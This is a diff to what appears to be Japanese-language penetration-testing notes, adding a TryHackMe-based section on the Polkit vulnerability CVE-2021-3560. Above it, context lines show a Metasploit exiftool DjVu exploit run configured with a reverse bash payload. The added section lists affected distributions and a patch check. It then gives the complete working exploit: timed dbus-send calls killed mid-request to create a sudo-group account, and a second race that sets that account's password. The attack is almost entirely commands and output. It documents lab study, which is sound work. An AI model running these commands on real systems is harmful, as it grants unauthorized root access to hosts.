@@ -679,3 +679,49 @@ PAYLOAD => cmd/unix/reverse_bash
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
 [+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
 ```
+
+## CVE-2021-3560 (Polkit)
+
+https://tryhackme.com/room/polkit
+
+- Red Hat Enterprise Linux 8
+- Fedora 21 (or later)
+- Debian Testing ("Bullseye")
+- Ubuntu 20.04 LTS ("Focal Fossa")
+
+ubuntuの場合、`0.105-26ubuntu1.1` でパッチがリリースされた。
+
+```sh
+apt list --installed | grep policykit-1
+```
+
+### エクスプロイト
+
+```sh
+# コマンドの実行にかかる時間を特定する
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+
+real    0m0.012s
+user    0m0.002s
+sys     0m0.000s
+```
+
+```sh
+# 処理中に強制終了する
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
+[1] 1348
+
+# 作成確認
+tryhackme@polkit:~$ id attacker
+uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
+```
+
+```sh
+# パスワード生成
+openssl passwd -6 Expl01ted
+
+# 設定
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
+```
